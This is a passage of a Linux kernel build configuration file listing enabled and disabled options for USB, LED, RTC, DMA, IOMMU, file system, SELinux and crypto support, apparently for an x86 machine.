# CONFIG_USB_EMI26 is not set
# CONFIG_USB_ADUTUX is not set
# CONFIG_USB_SEVSEG is not set
# CONFIG_USB_LEGOTOWER is not set
# CONFIG_USB_LCD is not set
# CONFIG_USB_CYPRESS_CY7C63 is not set
# CONFIG_USB_CYTHERM is not set
# CONFIG_USB_IDMOUSE is not set
# CONFIG_USB_FTDI_ELAN is not set
# CONFIG_USB_APPLEDISPLAY is not set
# CONFIG_USB_SISUSBVGA is not set
# CONFIG_USB_LD is not set
# CONFIG_USB_TRANCEVIBRATOR is not set
# CONFIG_USB_IOWARRIOR is not set
# CONFIG_USB_TEST is not set
# CONFIG_USB_EHSET_TEST_FIXTURE is not set
# CONFIG_USB_ISIGHTFW is not set
# CONFIG_USB_YUREX is not set
# CONFIG_USB_EZUSB_FX2 is not set
# CONFIG_USB_HUB_USB251XB is not set
# CONFIG_USB_HSIC_USB3503 is not set
# CONFIG_USB_HSIC_USB4604 is not set
# CONFIG_USB_LINK_LAYER_TEST is not set
# CONFIG_USB_CHAOSKEY is not set

#
# USB Physical Layer drivers
#
# CONFIG_NOP_USB_XCEIV is not set
# CONFIG_USB_ISP1301 is not set
# CONFIG_USB_GADGET is not set
# CONFIG_TYPEC is not set
# CONFIG_USB_ROLE_SWITCH is not set
# CONFIG_USB_LED_TRIG is not set
# CONFIG_USB_ULPI_BUS is not set
# CONFIG_UWB is not set
# CONFIG_MMC is not set
# CONFIG_MEMSTICK is not set
CONFIG_NEW_LEDS=y
CONFIG_LEDS_CLASS=y
# CONFIG_LEDS_CLASS_FLASH is not set
# CONFIG_LEDS_BRIGHTNESS_HW_CHANGED is not set

#
# LED drivers
#
# CONFIG_LEDS_APU is not set
# CONFIG_LEDS_LM3530 is not set
# CONFIG_LEDS_LM3642 is not set
# CONFIG_LEDS_PCA9532 is not set
# CONFIG_LEDS_LP3944 is not set
# CONFIG_LEDS_LP5521 is not set
# CONFIG_LEDS_LP5523 is not set
# CONFIG_LEDS_LP5562 is not set
# CONFIG_LEDS_LP8501 is not set
# CONFIG_LEDS_CLEVO_MAIL is not set
# CONFIG_LEDS_PCA955X is not set
# CONFIG_LEDS_PCA963X is not set
# CONFIG_LEDS_BD2802 is not set
# CONFIG_LEDS_INTEL_SS4200 is not set
# CONFIG_LEDS_TCA6507 is not set
# CONFIG_LEDS_TLC591XX is not set
# CONFIG_LEDS_LM355x is not set

#
# LED driver for blink(1) USB RGB LED is under Special HID drivers (HID_THINGM)
#
# CONFIG_LEDS_BLINKM is not set
# CONFIG_LEDS_MLXCPLD is not set
# CONFIG_LEDS_MLXREG is not set
# CONFIG_LEDS_USER is not set
# CONFIG_LEDS_NIC78BX is not set

#
# LED Triggers
#
CONFIG_LEDS_TRIGGERS=y
# CONFIG_LEDS_TRIGGER_TIMER is not set
# CONFIG_LEDS_TRIGGER_ONESHOT is not set
# CONFIG_LEDS_TRIGGER_DISK is not set
# CONFIG_LEDS_TRIGGER_HEARTBEAT is not set
# CONFIG_LEDS_TRIGGER_BACKLIGHT is not set
# CONFIG_LEDS_TRIGGER_CPU is not set
# CONFIG_LEDS_TRIGGER_ACTIVITY is not set
# CONFIG_LEDS_TRIGGER_DEFAULT_ON is not set

#
# iptables trigger is under Netfilter config (LED target)
#
# CONFIG_LEDS_TRIGGER_TRANSIENT is not set
# CONFIG_LEDS_TRIGGER_CAMERA is not set
# CONFIG_LEDS_TRIGGER_PANIC is not set
# CONFIG_LEDS_TRIGGER_NETDEV is not set
# CONFIG_ACCESSIBILITY is not set
# CONFIG_INFINIBAND is not set
CONFIG_EDAC_ATOMIC_SCRUB=y
CONFIG_EDAC_SUPPORT=y
CONFIG_EDAC=y
CONFIG_EDAC_LEGACY_SYSFS=y
# CONFIG_EDAC_DEBUG is not set
CONFIG_EDAC_DECODE_MCE=y
# CONFIG_EDAC_AMD64 is not set
# CONFIG_EDAC_E752X is not set
# CONFIG_EDAC_I82975X is not set
# CONFIG_EDAC_I3000 is not set
# CONFIG_EDAC_I3200 is not set
# CONFIG_EDAC_IE31200 is not set
# CONFIG_EDAC_X38 is not set
# CONFIG_EDAC_I5400 is not set
# CONFIG_EDAC_I7CORE is not set
# CONFIG_EDAC_I5000 is not set
# CONFIG_EDAC_I5100 is not set
# CONFIG_EDAC_I7300 is not set
# CONFIG_EDAC_SBRIDGE is not set
# CONFIG_EDAC_SKX is not set
# CONFIG_EDAC_PND2 is not set
CONFIG_RTC_LIB=y
CONFIG_RTC_MC146818_LIB=y
CONFIG_RTC_CLASS=y
# CONFIG_RTC_HCTOSYS is not set
CONFIG_RTC_SYSTOHC=y
CONFIG_RTC_SYSTOHC_DEVICE="rtc0"
# CONFIG_RTC_DEBUG is not set
CONFIG_RTC_NVMEM=y

#
# RTC interfaces
#
CONFIG_RTC_INTF_SYSFS=y
CONFIG_RTC_INTF_PROC=y
CONFIG_RTC_INTF_DEV=y
# CONFIG_RTC_INTF_DEV_UIE_EMUL is not set
# CONFIG_RTC_DRV_TEST is not set

#
# I2C RTC drivers
#
# CONFIG_RTC_DRV_ABB5ZES3 is not set
# CONFIG_RTC_DRV_ABX80X is not set
# CONFIG_RTC_DRV_DS1307 is not set
# CONFIG_RTC_DRV_DS1374 is not set
# CONFIG_RTC_DRV_DS1672 is not set
# CONFIG_RTC_DRV_MAX6900 is not set
# CONFIG_RTC_DRV_RS5C372 is not set
# CONFIG_RTC_DRV_ISL1208 is not set
# CONFIG_RTC_DRV_ISL12022 is not set
# CONFIG_RTC_DRV_X1205 is not set
# CONFIG_RTC_DRV_PCF8523 is not set
# CONFIG_RTC_DRV_PCF85063 is not set
# CONFIG_RTC_DRV_PCF85363 is not set
# CONFIG_RTC_DRV_PCF8563 is not set
# CONFIG_RTC_DRV_PCF8583 is not set
# CONFIG_RTC_DRV_M41T80 is not set
# CONFIG_RTC_DRV_BQ32K is not set
# CONFIG_RTC_DRV_S35390A is not set
# CONFIG_RTC_DRV_FM3130 is not set
# CONFIG_RTC_DRV_RX8010 is not set
# CONFIG_RTC_DRV_RX8581 is not set
# CONFIG_RTC_DRV_RX8025 is not set
# CONFIG_RTC_DRV_EM3027 is not set
# CONFIG_RTC_DRV_RV8803 is not set

#
# SPI RTC drivers
#
CONFIG_RTC_I2C_AND_SPI=y

#
# SPI and I2C RTC drivers
#
# CONFIG_RTC_DRV_DS3232 is not set
# CONFIG_RTC_DRV_PCF2127 is not set
# CONFIG_RTC_DRV_RV3029C2 is not set

#
# Platform RTC drivers
#
CONFIG_RTC_DRV_CMOS=y
# CONFIG_RTC_DRV_DS1286 is not set
# CONFIG_RTC_DRV_DS1511 is not set
# CONFIG_RTC_DRV_DS1553 is not set
# CONFIG_RTC_DRV_DS1685_FAMILY is not set
# CONFIG_RTC_DRV_DS1742 is not set
# CONFIG_RTC_DRV_DS2404 is not set
# CONFIG_RTC_DRV_STK17TA8 is not set
# CONFIG_RTC_DRV_M48T86 is not set
# CONFIG_RTC_DRV_M48T35 is not set
# CONFIG_RTC_DRV_M48T59 is not set
# CONFIG_RTC_DRV_MSM6242 is not set
# CONFIG_RTC_DRV_BQ4802 is not set
# CONFIG_RTC_DRV_RP5C01 is not set
# CONFIG_RTC_DRV_V3020 is not set

#
# on-CPU RTC drivers
#
# CONFIG_RTC_DRV_FTRTC010 is not set

#
# HID Sensor RTC drivers
#
# CONFIG_RTC_DRV_HID_SENSOR_TIME is not set
CONFIG_DMADEVICES=y
# CONFIG_DMADEVICES_DEBUG is not set

#
# DMA Devices
#
CONFIG_DMA_ENGINE=y
CONFIG_DMA_VIRTUAL_CHANNELS=y
CONFIG_DMA_ACPI=y
# CONFIG_ALTERA_MSGDMA is not set
# CONFIG_INTEL_IDMA64 is not set
# CONFIG_INTEL_IOATDMA is not set
# CONFIG_QCOM_HIDMA_MGMT is not set
# CONFIG_QCOM_HIDMA is not set
CONFIG_DW_DMAC_CORE=y
# CONFIG_DW_DMAC is not set
# CONFIG_DW_DMAC_PCI is not set
CONFIG_HSU_DMA=y

#
# DMA Clients
#
# CONFIG_ASYNC_TX_DMA is not set
# CONFIG_DMATEST is not set

#
# DMABUF options
#
CONFIG_SYNC_FILE=y
# CONFIG_SW_SYNC is not set
# CONFIG_AUXDISPLAY is not set
# CONFIG_UIO is not set
# CONFIG_VFIO is not set
# CONFIG_VIRT_DRIVERS is not set
CONFIG_VIRTIO_MENU=y
# CONFIG_VIRTIO_PCI is not set
# CONFIG_VIRTIO_MMIO is not set

#
# Microsoft Hyper-V guest support
#
# CONFIG_STAGING is not set
CONFIG_X86_PLATFORM_DEVICES=y
# CONFIG_ACER_WIRELESS is not set
# CONFIG_ACERHDF is not set
# CONFIG_ASUS_LAPTOP is not set
# CONFIG_DELL_SMBIOS is not set
# CONFIG_DELL_SMO8800 is not set
# CONFIG_DELL_RBTN is not set
# CONFIG_FUJITSU_LAPTOP is not set
# CONFIG_FUJITSU_TABLET is not set
# CONFIG_AMILO_RFKILL is not set
# CONFIG_GPD_POCKET_FAN is not set
# CONFIG_HP_ACCEL is not set
# CONFIG_HP_WIRELESS is not set
# CONFIG_MSI_LAPTOP is not set
# CONFIG_PANASONIC_LAPTOP is not set
# CONFIG_COMPAL_LAPTOP is not set
# CONFIG_SONY_LAPTOP is not set
# CONFIG_IDEAPAD_LAPTOP is not set
# CONFIG_THINKPAD_ACPI is not set
# CONFIG_SENSORS_HDAPS is not set
# CONFIG_INTEL_MENLOW is not set
CONFIG_EEEPC_LAPTOP=y
# CONFIG_ASUS_WIRELESS is not set
# CONFIG_ACPI_WMI is not set
# CONFIG_TOPSTAR_LAPTOP is not set
# CONFIG_TOSHIBA_BT_RFKILL is not set
# CONFIG_TOSHIBA_HAPS is not set
# CONFIG_ACPI_CMPC is not set
# CONFIG_INTEL_HID_EVENT is not set
# CONFIG_INTEL_VBTN is not set
# CONFIG_INTEL_IPS is not set
# CONFIG_INTEL_PMC_CORE is not set
# CONFIG_IBM_RTL is not set
# CONFIG_SAMSUNG_LAPTOP is not set
# CONFIG_INTEL_OAKTRAIL is not set
# CONFIG_SAMSUNG_Q10 is not set
# CONFIG_APPLE_GMUX is not set
# CONFIG_INTEL_RST is not set
# CONFIG_INTEL_SMARTCONNECT is not set
# CONFIG_PVPANIC is not set
# CONFIG_INTEL_PMC_IPC is not set
# CONFIG_SURFACE_PRO3_BUTTON is not set
# CONFIG_INTEL_PUNIT_IPC is not set
# CONFIG_MLX_PLATFORM is not set
# CONFIG_INTEL_TURBO_MAX_3 is not set
# CONFIG_I2C_MULTI_INSTANTIATE is not set
# CONFIG_INTEL_ATOMISP2_PM is not set
CONFIG_PMC_ATOM=y
# CONFIG_CHROME_PLATFORMS is not set
# CONFIG_MELLANOX_PLATFORM is not set
CONFIG_CLKDEV_LOOKUP=y
CONFIG_HAVE_CLK_PREPARE=y
CONFIG_COMMON_CLK=y

#
# Common Clock Framework
#
# CONFIG_COMMON_CLK_MAX9485 is not set
# CONFIG_COMMON_CLK_SI5351 is not set
# CONFIG_COMMON_CLK_SI544 is not set
# CONFIG_COMMON_CLK_CDCE706 is not set
# CONFIG_COMMON_CLK_CS2000_CP is not set
# CONFIG_HWSPINLOCK is not set

#
# Clock Source drivers
#
CONFIG_CLKEVT_I8253=y
CONFIG_I8253_LOCK=y
CONFIG_CLKBLD_I8253=y
CONFIG_MAILBOX=y
CONFIG_PCC=y
# CONFIG_ALTERA_MBOX is not set
CONFIG_IOMMU_API=y
CONFIG_IOMMU_SUPPORT=y

#
# Generic IOMMU Pagetable Support
#
# CONFIG_IOMMU_DEBUGFS is not set
# CONFIG_IOMMU_DEFAULT_PASSTHROUGH is not set
CONFIG_IOMMU_IOVA=y
CONFIG_AMD_IOMMU=y
# CONFIG_AMD_IOMMU_V2 is not set
CONFIG_DMAR_TABLE=y
CONFIG_INTEL_IOMMU=y
# CONFIG_INTEL_IOMMU_SVM is not set
# CONFIG_INTEL_IOMMU_DEFAULT_ON is not set
CONFIG_INTEL_IOMMU_FLOPPY_WA=y
# CONFIG_IRQ_REMAP is not set

#
# Remoteproc drivers
#
# CONFIG_REMOTEPROC is not set

#
# Rpmsg drivers
#
# CONFIG_RPMSG_QCOM_GLINK_RPM is not set
# CONFIG_RPMSG_VIRTIO is not set
# CONFIG_SOUNDWIRE is not set

#
# SOC (System On Chip) specific Drivers
#

#
# Amlogic SoC drivers
#

#
# Broadcom SoC drivers
#

#
# NXP/Freescale QorIQ SoC drivers
#

#
# i.MX SoC drivers
#

#
# Qualcomm SoC drivers
#
# CONFIG_SOC_TI is not set

#
# Xilinx SoC drivers
#
# CONFIG_XILINX_VCU is not set
CONFIG_PM_DEVFREQ=y

#
# DEVFREQ Governors
#
CONFIG_DEVFREQ_GOV_SIMPLE_ONDEMAND=y
# CONFIG_DEVFREQ_GOV_PERFORMANCE is not set
# CONFIG_DEVFREQ_GOV_POWERSAVE is not set
# CONFIG_DEVFREQ_GOV_USERSPACE is not set
# CONFIG_DEVFREQ_GOV_PASSIVE is not set

#
# DEVFREQ Drivers
#
# CONFIG_PM_DEVFREQ_EVENT is not set
# CONFIG_EXTCON is not set
# CONFIG_MEMORY is not set
# CONFIG_IIO is not set
# CONFIG_NTB is not set
# CONFIG_VME_BUS is not set
# CONFIG_PWM is not set

#
# IRQ chip support
#
CONFIG_ARM_GIC_MAX_NR=1
# CONFIG_IPACK_BUS is not set
# CONFIG_RESET_CONTROLLER is not set
# CONFIG_FMC is not set

#
# PHY Subsystem
#
# CONFIG_GENERIC_PHY is not set
# CONFIG_BCM_KONA_USB2_PHY is not set
# CONFIG_PHY_PXA_28NM_HSIC is not set
# CONFIG_PHY_PXA_28NM_USB2 is not set
# CONFIG_POWERCAP is not set
# CONFIG_MCB is not set

#
# Performance monitor support
#
CONFIG_RAS=y
# CONFIG_THUNDERBOLT is not set

#
# Android
#
# CONFIG_ANDROID is not set
# CONFIG_LIBNVDIMM is not set
# CONFIG_DAX is not set
CONFIG_NVMEM=y

#
# HW tracing support
#
# CONFIG_STM is not set
# CONFIG_INTEL_TH is not set
# CONFIG_FPGA is not set
CONFIG_PM_OPP=y
# CONFIG_UNISYS_VISORBUS is not set
# CONFIG_SIOX is not set
# CONFIG_SLIMBUS is not set

#
# File systems
#
CONFIG_DCACHE_WORD_ACCESS=y
CONFIG_FS_IOMAP=y
# CONFIG_EXT2_FS is not set
# CONFIG_EXT3_FS is not set
CONFIG_EXT4_FS=y
CONFIG_EXT4_USE_FOR_EXT2=y
CONFIG_EXT4_FS_POSIX_ACL=y
CONFIG_EXT4_FS_SECURITY=y
# CONFIG_EXT4_ENCRYPTION is not set
# CONFIG_EXT4_DEBUG is not set
CONFIG_JBD2=y
# CONFIG_JBD2_DEBUG is not set
CONFIG_FS_MBCACHE=y
# CONFIG_REISERFS_FS is not set
# CONFIG_JFS_FS is not set
# CONFIG_XFS_FS is not set
# CONFIG_GFS2_FS is not set
# CONFIG_BTRFS_FS is not set
# CONFIG_NILFS2_FS is not set
# CONFIG_F2FS_FS is not set
# CONFIG_FS_DAX is not set
CONFIG_FS_POSIX_ACL=y
CONFIG_EXPORTFS=y
# CONFIG_EXPORTFS_BLOCK_OPS is not set
CONFIG_FILE_LOCKING=y
CONFIG_MANDATORY_FILE_LOCKING=y
# CONFIG_FS_ENCRYPTION is not set
CONFIG_FSNOTIFY=y
CONFIG_DNOTIFY=y
CONFIG_INOTIFY_USER=y
# CONFIG_FANOTIFY is not set
CONFIG_QUOTA=y
CONFIG_QUOTA_NETLINK_INTERFACE=y
# CONFIG_PRINT_QUOTA_WARNING is not set
# CONFIG_QUOTA_DEBUG is not set
CONFIG_QUOTA_TREE=y
# CONFIG_QFMT_V1 is not set
CONFIG_QFMT_V2=y
CONFIG_QUOTACTL=y
CONFIG_QUOTACTL_COMPAT=y
CONFIG_AUTOFS4_FS=y
CONFIG_AUTOFS_FS=y
# CONFIG_FUSE_FS is not set
# CONFIG_OVERLAY_FS is not set

#
# Caches
#
# CONFIG_FSCACHE is not set

#
# CD-ROM/DVD Filesystems
#
CONFIG_ISO9660_FS=y
CONFIG_JOLIET=y
CONFIG_ZISOFS=y
# CONFIG_UDF_FS is not set

#
# DOS/FAT/NT Filesystems
#
CONFIG_FAT_FS=y
CONFIG_MSDOS_FS=y
CONFIG_VFAT_FS=y
CONFIG_FAT_DEFAULT_CODEPAGE=437
CONFIG_FAT_DEFAULT_IOCHARSET="iso8859-1"
# CONFIG_FAT_DEFAULT_UTF8 is not set
# CONFIG_NTFS_FS is not set

#
# Pseudo filesystems
#
CONFIG_PROC_FS=y
CONFIG_PROC_KCORE=y
CONFIG_PROC_VMCORE=y
# CONFIG_PROC_VMCORE_DEVICE_DUMP is not set
CONFIG_PROC_SYSCTL=y
CONFIG_PROC_PAGE_MONITOR=y
# CONFIG_PROC_CHILDREN is not set
CONFIG_KERNFS=y
CONFIG_SYSFS=y
CONFIG_TMPFS=y
CONFIG_TMPFS_POSIX_ACL=y
CONFIG_TMPFS_XATTR=y
CONFIG_HUGETLBFS=y
CONFIG_HUGETLB_PAGE=y
CONFIG_MEMFD_CREATE=y
# CONFIG_CONFIGFS_FS is not set
CONFIG_EFIVAR_FS=m
CONFIG_MISC_FILESYSTEMS=y
# CONFIG_ORANGEFS_FS is not set
# CONFIG_ADFS_FS is not set
# CONFIG_AFFS_FS is not set
# CONFIG_ECRYPT_FS is not set
# CONFIG_HFS_FS is not set
# CONFIG_HFSPLUS_FS is not set
# CONFIG_BEFS_FS is not set
# CONFIG_BFS_FS is not set
# CONFIG_EFS_FS is not set
# CONFIG_CRAMFS is not set
# CONFIG_SQUASHFS is not set
# CONFIG_VXFS_FS is not set
# CONFIG_MINIX_FS is not set
# CONFIG_OMFS_FS is not set
# CONFIG_HPFS_FS is not set
# CONFIG_QNX4FS_FS is not set
# CONFIG_QNX6FS_FS is not set
# CONFIG_ROMFS_FS is not set
# CONFIG_PSTORE is not set
# CONFIG_SYSV_FS is not set
# CONFIG_UFS_FS is not set
CONFIG_NETWORK_FILESYSTEMS=y
CONFIG_NFS_FS=y
CONFIG_NFS_V2=y
CONFIG_NFS_V3=y
CONFIG_NFS_V3_ACL=y
CONFIG_NFS_V4=y
# CONFIG_NFS_SWAP is not set
# CONFIG_NFS_V4_1 is not set
CONFIG_ROOT_NFS=y
# CONFIG_NFS_USE_LEGACY_DNS is not set
CONFIG_NFS_USE_KERNEL_DNS=y
# CONFIG_NFSD is not set
CONFIG_GRACE_PERIOD=y
CONFIG_LOCKD=y
CONFIG_LOCKD_V4=y
CONFIG_NFS_ACL_SUPPORT=y
CONFIG_NFS_COMMON=y
CONFIG_SUNRPC=y
CONFIG_SUNRPC_GSS=y
# CONFIG_SUNRPC_DEBUG is not set
# CONFIG_CEPH_FS is not set
# CONFIG_CIFS is not set
# CONFIG_CODA_FS is not set
# CONFIG_AFS_FS is not set
CONFIG_NLS=y
CONFIG_NLS_DEFAULT="utf8"
CONFIG_NLS_CODEPAGE_437=y
# CONFIG_NLS_CODEPAGE_737 is not set
# CONFIG_NLS_CODEPAGE_775 is not set
# CONFIG_NLS_CODEPAGE_850 is not set
# CONFIG_NLS_CODEPAGE_852 is not set
# CONFIG_NLS_CODEPAGE_855 is not set
# CONFIG_NLS_CODEPAGE_857 is not set
# CONFIG_NLS_CODEPAGE_860 is not set
# CONFIG_NLS_CODEPAGE_861 is not set
# CONFIG_NLS_CODEPAGE_862 is not set
# CONFIG_NLS_CODEPAGE_863 is not set
# CONFIG_NLS_CODEPAGE_864 is not set
# CONFIG_NLS_CODEPAGE_865 is not set
# CONFIG_NLS_CODEPAGE_866 is not set
# CONFIG_NLS_CODEPAGE_869 is not set
# CONFIG_NLS_CODEPAGE_936 is not set
# CONFIG_NLS_CODEPAGE_950 is not set
# CONFIG_NLS_CODEPAGE_932 is not set
# CONFIG_NLS_CODEPAGE_949 is not set
# CONFIG_NLS_CODEPAGE_874 is not set
# CONFIG_NLS_ISO8859_8 is not set
# CONFIG_NLS_CODEPAGE_1250 is not set
# CONFIG_NLS_CODEPAGE_1251 is not set
CONFIG_NLS_ASCII=y
CONFIG_NLS_ISO8859_1=y
# CONFIG_NLS_ISO8859_2 is not set
# CONFIG_NLS_ISO8859_3 is not set
# CONFIG_NLS_ISO8859_4 is not set
# CONFIG_NLS_ISO8859_5 is not set
# CONFIG_NLS_ISO8859_6 is not set
# CONFIG_NLS_ISO8859_7 is not set
# CONFIG_NLS_ISO8859_9 is not set
# CONFIG_NLS_ISO8859_13 is not set
# CONFIG_NLS_ISO8859_14 is not set
# CONFIG_NLS_ISO8859_15 is not set
# CONFIG_NLS_KOI8_R is not set
# CONFIG_NLS_KOI8_U is not set
# CONFIG_NLS_MAC_ROMAN is not set
# CONFIG_NLS_MAC_CELTIC is not set
# CONFIG_NLS_MAC_CENTEURO is not set
# CONFIG_NLS_MAC_CROATIAN is not set
# CONFIG_NLS_MAC_CYRILLIC is not set
# CONFIG_NLS_MAC_GAELIC is not set
# CONFIG_NLS_MAC_GREEK is not set
# CONFIG_NLS_MAC_ICELAND is not set
# CONFIG_NLS_MAC_INUIT is not set
# CONFIG_NLS_MAC_ROMANIAN is not set
# CONFIG_NLS_MAC_TURKISH is not set
CONFIG_NLS_UTF8=y

#
# Security options
#
CONFIG_KEYS=y
CONFIG_KEYS_COMPAT=y
# CONFIG_PERSISTENT_KEYRINGS is not set
# CONFIG_BIG_KEYS is not set
# CONFIG_ENCRYPTED_KEYS is not set
# CONFIG_KEY_DH_OPERATIONS is not set
# CONFIG_SECURITY_DMESG_RESTRICT is not set
CONFIG_SECURITY=y
CONFIG_SECURITY_WRITABLE_HOOKS=y
# CONFIG_SECURITYFS is not set
CONFIG_SECURITY_NETWORK=y
CONFIG_PAGE_TABLE_ISOLATION=y
# CONFIG_SECURITY_NETWORK_XFRM is not set
# CONFIG_SECURITY_PATH is not set
# CONFIG_INTEL_TXT is not set
CONFIG_LSM_MMAP_MIN_ADDR=65536
CONFIG_HAVE_HARDENED_USERCOPY_ALLOCATOR=y
# CONFIG_HARDENED_USERCOPY is not set
# CONFIG_FORTIFY_SOURCE is not set
# CONFIG_STATIC_USERMODEHELPER is not set
CONFIG_SECURITY_SELINUX=y
CONFIG_SECURITY_SELINUX_BOOTPARAM=y
CONFIG_SECURITY_SELINUX_BOOTPARAM_VALUE=1
CONFIG_SECURITY_SELINUX_DISABLE=y
CONFIG_SECURITY_SELINUX_DEVELOP=y
CONFIG_SECURITY_SELINUX_AVC_STATS=y
CONFIG_SECURITY_SELINUX_CHECKREQPROT_VALUE=0
# CONFIG_SECURITY_SMACK is not set
# CONFIG_SECURITY_TOMOYO is not set
# CONFIG_SECURITY_APPARMOR is not set
# CONFIG_SECURITY_LOADPIN is not set
# CONFIG_SECURITY_YAMA is not set
CONFIG_INTEGRITY=y
# CONFIG_INTEGRITY_SIGNATURE is not set
CONFIG_INTEGRITY_AUDIT=y
# CONFIG_IMA is not set
# CONFIG_EVM is not set
CONFIG_DEFAULT_SECURITY_SELINUX=y
# CONFIG_DEFAULT_SECURITY_DAC is not set
CONFIG_DEFAULT_SECURITY="selinux"
CONFIG_CRYPTO=y

#
# Crypto core or helper
#
CONFIG_CRYPTO_ALGAPI=y
CONFIG_CRYPTO_ALGAPI2=y
CONFIG_CRYPTO_AEAD=y
CONFIG_CRYPTO_AEAD2=y
CONFIG_CRYPTO_BLKCIPHER=y
CONFIG_CRYPTO_BLKCIPHER2=y
CONFIG_CRYPTO_HASH=y
CONFIG_CRYPTO_HASH2=y
CONFIG_CRYPTO_RNG=y
CONFIG_CRYPTO_RNG2=y
CONFIG_CRYPTO_RNG_DEFAULT=y
CONFIG_CRYPTO_AKCIPHER2=y
CONFIG_CRYPTO_AKCIPHER=y
CONFIG_CRYPTO_KPP2=y
CONFIG_CRYPTO_ACOMP2=y
CONFIG_CRYPTO_RSA=y
# CONFIG_CRYPTO_DH is not set
# CONFIG_CRYPTO_ECDH is not set
CONFIG_CRYPTO_MANAGER=y
CONFIG_CRYPTO_MANAGER2=y
# CONFIG_CRYPTO_USER is not set
CONFIG_CRYPTO_MANAGER_DISABLE_TESTS=y
CONFIG_CRYPTO_GF128MUL=y
CONFIG_CRYPTO_NULL=y
CONFIG_CRYPTO_NULL2=y
# CONFIG_CRYPTO_PCRYPT is not set
CONFIG_CRYPTO_WORKQUEUE=y
# CONFIG_CRYPTO_CRYPTD is not set
# CONFIG_CRYPTO_MCRYPTD is not set
CONFIG_CRYPTO_AUTHENC=y
# CONFIG_CRYPTO_TEST is not set

#
# Authenticated Encryption with Associated Data
#
CONFIG_CRYPTO_CCM=y
CONFIG_CRYPTO_GCM=y
# CONFIG_CRYPTO_CHACHA20POLY1305 is not set
# CONFIG_CRYPTO_AEGIS128 is not set
# CONFIG_CRYPTO_AEGIS128L is not set
# CONFIG_CRYPTO_AEGIS256 is not set
# CONFIG_CRYPTO_AEGIS128_AESNI_SSE2 is not set
# CONFIG_CRYPTO_AEGIS128L_AESNI_SSE2 is not set
# CONFIG_CRYPTO_AEGIS256_AESNI_SSE2 is not set
# CONFIG_CRYPTO_MORUS640 is not set
# CONFIG_CRYPTO_MORUS640_SSE2 is not set
# CONFIG_CRYPTO_MORUS1280 is not set
# CONFIG_CRYPTO_MORUS1280_SSE2 is not set
# CONFIG_CRYPTO_MORUS1280_AVX2 is not set
CONFIG_CRYPTO_SEQIV=y
CONFIG_CRYPTO_ECHAINIV=y

#
# Block modes
#
CONFIG_CRYPTO_CBC=y
# CONFIG_CRYPTO_CFB is not set
CONFIG_CRYPTO_CTR=y
# CONFIG_CRYPTO_CTS is not set
# CONFIG_CRYPTO_ECB is not set
# CONFIG_CRYPTO_LRW is not set
# CONFIG_CRYPTO_PCBC is not set
# CONFIG_CRYPTO_XTS is not set
# CONFIG_CRYPTO_KEYWRAP is not set

#
# Hash modes
#
CONFIG_CRYPTO_CMAC=y
CONFIG_CRYPTO_HMAC=y
# CONFIG_CRYPTO_XCBC is not set
# CONFIG_CRYPTO_VMAC is not set

#
# Digest
#
CONFIG_CRYPTO_CRC32C=y
# CONFIG_CRYPTO_CRC32C_INTEL is not set
# CONFIG_CRYPTO_CRC32 is not set
# CONFIG_CRYPTO_CRC32_PCLMUL is not set
# CONFIG_CRYPTO_CRCT10DIF is not set
CONFIG_CRYPTO_GHASH=y
# CONFIG_CRYPTO_POLY1305 is not set
# CONFIG_CRYPTO_POLY1305_X86_64 is not set
# CONFIG_CRYPTO_MD4 is not set
CONFIG_CRYPTO_MD5=y
# CONFIG_CRYPTO_MICHAEL_MIC is not set
# CONFIG_CRYPTO_RMD128 is not set
# CONFIG_CRYPTO_RMD160 is not set
# CONFIG_CRYPTO_RMD256 is not set
# CONFIG_CRYPTO_RMD320 is not set
CONFIG_CRYPTO_SHA1=y
# CONFIG_CRYPTO_SHA1_SSSE3 is not set
# CONFIG_CRYPTO_SHA256_SSSE3 is not set
# CONFIG_CRYPTO_SHA512_SSSE3 is not set
# CONFIG_CRYPTO_SHA1_MB is not set
# CONFIG_CRYPTO_SHA256_MB is not set
# CONFIG_CRYPTO_SHA512_MB is not set
CONFIG_CRYPTO_SHA256=y
# CONFIG_CRYPTO_SHA512 is not set
# CONFIG_CRYPTO_SHA3 is not set
# CONFIG_CRYPTO_SM3 is not set
# CONFIG_CRYPTO_TGR192 is not set
# CONFIG_CRYPTO_WP512 is not set
# CONFIG_CRYPTO_GHASH_CLMUL_NI_INTEL is not set

#
# Ciphers
#
CONFIG_CRYPTO_AES=y
# CONFIG_CRYPTO_AES_TI is not set
# CONFIG_CRYPTO_AES_X86_64 is not set
# CONFIG_CRYPTO_AES_NI_INTEL is not set
# CONFIG_CRYPTO_ANUBIS is not set
CONFIG_CRYPTO_ARC4=y
# CONFIG_CRYPTO_BLOWFISH is not set
# CONFIG_CRYPTO_BLOWFISH_X86_64 is not set
# CONFIG_CRYPTO_CAMELLIA is not set
# CONFIG_CRYPTO_CAMELLIA_X86_64 is not set
# CONFIG_CRYPTO_CAMELLIA_AESNI_AVX_X86_64 is not set
# CONFIG_CRYPTO_CAMELLIA_AESNI_AVX2_X86_64 is not set
# CONFIG_CRYPTO_CAST5 is not set
# CONFIG_CRYPTO_CAST5_AVX_X86_64 is not set
# CONFIG_CRYPTO_CAST6 is not set
# CONFIG_CRYPTO_CAST6_AVX_X86_64 is not set
CONFIG_CRYPTO_DES=y
# CONFIG_CRYPTO_DES3_EDE_X86_64 is not set
# CONFIG_CRYPTO_FCRYPT is not set
# CONFIG_CRYPTO_KHAZAD is not set
# CONFIG_CRYPTO_SALSA20 is not set
# CONFIG_CRYPTO_CHACHA20 is not set
# CONFIG_CRYPTO_CHACHA20_X86_64 is not set
# CONFIG_CRYPTO_SEED is not set
# CONFIG_CRYPTO_SERPENT is not set
# CONFIG_CRYPTO_SERPENT_SSE2_X86_64 is not set
# CONFIG_CRYPTO_SERPENT_AVX_X86_64 is not set
# CONFIG_CRYPTO_SERPENT_AVX2_X86_64 is not set
# CONFIG_CRYPTO_SM4 is not set
# CONFIG_CRYPTO_TEA is not set
# CONFIG_CRYPTO_TWOFISH is not set
# CONFIG_CRYPTO_TWOFISH_X86_64 is not set
# CONFIG_CRYPTO_TWOFISH_X86_64_3WAY is not set
# CONFIG_CRYPTO_TWOFISH_AVX_X86_64 is not set

#
# Compression
#
# CONFIG_CRYPTO_DEFLATE is not set
# CONFIG_CRYPTO_LZO is not set
# CONFIG_CRYPTO_842 is not set
# CONFIG_CRYPTO_LZ4 is not set
# CONFIG_CRYPTO_LZ4HC is not set
# CONFIG_CRYPTO_ZSTD is not set

#
# Random Number Generation
#
# CONFIG_CRYPTO_ANSI_CPRNG is not set
CONFIG_CRYPTO_DRBG_MENU=y
CONFIG_CRYPTO_DRBG_HMAC=y
